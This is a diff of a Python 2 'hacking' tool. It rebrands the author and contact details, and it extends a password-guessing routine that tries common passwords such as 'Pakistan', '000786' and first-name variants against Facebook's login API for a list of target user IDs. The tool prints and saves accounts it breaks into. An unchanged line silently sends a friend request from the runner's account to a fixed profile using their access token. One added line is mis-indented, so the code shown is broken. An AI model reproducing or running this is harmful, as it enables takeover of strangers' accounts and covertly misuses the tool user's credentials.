@@ -48,16 +48,16 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[0;39m░░░░░██╗░█████╗░███╗░░░███╗
-\033[0;39m░░░░░██║██╔══██╗████╗░████║
-\033[0;39m░░░░░██║███████║██╔████╔██║
-\033[0;39m██╗░░██║██╔══██║██║╚██╔╝██║
-\033[0;39m╚█████╔╝██║░░██║██║░╚═╝░██║
-\033[0;39m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
+\033[1;39m╭━━━┳╮╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╭━━━╮╱╭╮╱╱╱╱╭╮
+\033[1;39m┃╭━╮┃┃╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱┃╭━╮┃╱┃┃╱╱╱╱┃┃
+\033[1;39m┃╰━━┫╰━┳━━┫╰━┳━━━┳━━┳━╯┣━━╮╱╱┃┃╱┃┣━┫╰━┳━━┫╰━╮
+\033[1;39m╰━━╮┃╭╮┃╭╮┃╭╮┣━━┃┃╭╮┃╭╮┃╭╮┣━━┫╰━╯┃╭┫╭╮┃╭╮┃╭╮┃
+\033[1;39m┃╰━╯┃┃┃┃╭╮┃┃┃┃┃━━┫╭╮┃╰╯┃╭╮┣━━┫╭━╮┃┃┃╰╯┃╭╮┃╰╯┃
+\033[1;39m╰━━━┻╯╰┻╯╰┻╯╰┻━━━┻╯╰┻━━┻╯╰╯╱╱╰╯╱╰┻╯╰━━┻╯╰┻━━╯
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;38m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mJAM-SHAHRUKH\033[0;31m║
-\033[0;38m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/JAM\033[0m \033[0;31m║
-\033[0;38m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m+971528752764\033[0;31m║
+\033[0;38m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mARBAB-ALI-MEMON\033[0;31m║
+\033[0;38m║\033[1;33m* \033[1;33mAbout  \033[1;33m : \033[1;33m\033[4mCYBER-GANGE-PLAYER\033[0m \033[0;31m║
+\033[0;38m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m+923003023263\033[0;31m║
 \033[0;39m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
@@ -78,28 +78,28 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\x1b[0;31m⚔════════════════════════☠════════════════════════⚔"
 print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   
-\033[1;96m[¤] \x1b[0;31mWHATSAPP : +971528752764\x1b[1;96m  
-\033[1;93m[¤] \x1b[0;31mFACEBOOK : JAM SHAHRUKH\x1b[1;96m  
-\033[1;93m[¤] \x1b[0;31mYOUTUBE  : JAM SHAHRUKH TECHNICAL \x1b[0;31m"""
+\033[1;96m[¤] \x1b[0;31mWHATSAPP : +923003023263\x1b[1;96m  
+\033[1;93m[¤] \x1b[0;31mFACEBOOK : ARBAB-ALI-MEMON\x1b[1;96m  
+\033[1;93m[¤] \x1b[0;31mYOUTUBE  : CYBER GANGE HIDDEN TRICKER \x1b[0;31m"""
 print " \x1b[1;93m⚔═══════════════════════☠════════════════════════⚔"
 
-CorrectUsername = "jam"
-CorrectPassword = "jam"
+CorrectUsername = "King"
+CorrectPassword = "Arbab"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;96m[☆] \x1b[0;31mUSERNAME TOOLS INI \x1b[1;96m>>>> ")
+    username = raw_input("\033[1;96m[☆] \x1b[0;31mUSERNAME TOOLS \x1b[1;96m>>>> ")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m[☆] \x1b[0;31mPASSWORD TOOLS INI \x1b[1;96m>>>> ")
+    	password = raw_input("\033[1;96m[☆] \x1b[0;31mPASSWORD TOOLS \x1b[1;96m>>>> ")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username
             loop = 'false'
         else:
             print "yang bener dong"
-            os.system('xdg-open https://wa.me/6285691015635')
+            os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
     else:
         print "salah sayang!"
-        os.system('xdg-open https://wa.me/6285691015635')
+        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 
 def login():
 	os.system('clear')
@@ -140,14 +140,14 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+				os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\x1b[1;91m[!] There is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;92m[!] Your Account is on Checkpoint")
+			print("\n\x1b[1;92m[!] Meri Jan Love u Account CP Pe He")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
@@ -193,7 +193,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hacking"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Shahrukh"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update Arbab"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -316,42 +316,42 @@ def pilih_super():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass1 + '\n'
+				print '\x1b[1;92m[HACK-ARBAB] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass1 + '\n'
 				oks.append(user+pass1)
 			else:
 				pass2 = '000786'
 				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 				q = json.load(data)
 				if 'access_token' in q:
-					print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass2 + '\n'
+					print '\x1b[1;92m[HACK-ARBAB] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass2 + '\n'
 					oks.append(user+pass2)
 				else:
 					pass3 = 'Pakistan'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
-						print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass3 + '\n'
+						print '\x1b[1;92m[HACK-ARBAB] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass3 + '\n'
 						oks.append(user+pass3)
 					else:
 						pass4 = b['first_name'] + '786'
 						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 						q = json.load(data)
 						if 'access_token' in q:
-							print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass4 + '\n'
+							print '\x1b[1;92m[HACK-ARBAB] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass4 + '\n'
 							oks.append(user+pass4)
 						else:
 							pass5 = b['first_name'] + '123'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass5 + '\n'
+								print '\x1b[1;92m[HACK-ARBAB] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass5 + '\n'
 								oks.append(user+pass5)
 							else:
 								pass6 = b['first_name'] + '1234'
 								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 								q = json.load(data)
 								if 'access_token' in q:
-									print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass6 + '\n'
+									print '\x1b[1;92m[HACK-ARBAB] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass6 + '\n'
 									oks.append(user+pass6)
 								else:
 									a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
@@ -360,10 +360,18 @@ def pilih_super():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
-										print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass7 + '\n'
+										print '\x1b[1;92m[HACK-ARBAB] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass7 + '\n'
 										oks.append(user+pass7)
-								
- 										
+									else:	
+										pass8 = 'Pakistan1'
+										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+										q = json.load(data)
+										if 'access_token' in q:
+										print '\x1b[1;92m[HACK-ARBAB] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass8 + '\n'
+											oks.append(user+pass8)																
+																																										
+																																																			
+				
 		except:																		
 			pass
 		
